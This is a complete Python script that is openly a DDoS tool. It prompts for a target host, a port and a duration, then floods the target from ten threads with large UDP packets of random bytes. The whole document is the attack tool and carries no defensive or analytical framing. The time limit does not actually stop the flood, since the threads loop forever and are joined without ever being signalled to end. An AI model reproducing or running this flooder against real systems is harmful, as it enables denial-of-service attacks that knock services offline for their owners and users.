#!/usr/bin/python

import os
import socket
import time
import random
import sys
import threading
import logging

# Setting up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Defining colors for terminal output
wi = "\033[1;37m"
rd = "\033[0;31m"
gr = "\033[1;32m"
yl = "\033[1;33m"
pu = "\033[1;35m"

def doss(ip, port, duration):
    """Function to start the DDoS attack."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payloads = random._urandom(10000)

    os.system("clear")
    logging.info("Starting DDoS attack on %s:%d for %d seconds.", ip, port, duration)

    sent = 10
    threads = []
    
    # Creating multiple threads to send packets
    for i in range(10):
        t = threading.Thread(target=send_packets, args=(sock, payloads, ip, port))
        threads.append(t)
        t.start()

    time.sleep(duration)

    # Stopping the threads after the duration
    for t in threads:
        t.join()

def send_packets(sock, payloads, ip, port):
    """Thread function to continuously send packets to the target."""
    while True:
        try:
            sock.sendto(payloads, (ip, port))
            logging.info('Attacking on %s:%d', ip, port)
        except socket.error as e:
            logging.error('Socket error: %s', e)
            break
        except KeyboardInterrupt:
            logging.info('Attack interrupted by user')
            sys.exit()
        except Exception as e:
            logging.error('Unexpected error: %s', e)
            break

def main():
    """Main function to handle user input and start the attack."""
    try:
        ip = input(yl + "[*] IP or Host Target: ")
        port = int(input(wi + "[*] Port [Default port 80]: ") or 80)
        duration = int(input(rd + "[*] Duration of the Attack (in seconds): "))

        doss(ip, port, duration)
    except ValueError:
        logging.error("Invalid input. Please enter valid IP address, port, and duration.")
    except KeyboardInterrupt:
        logging.info("Program interrupted by user.")
        sys.exit()

if __name__ == "__main__":
    main()
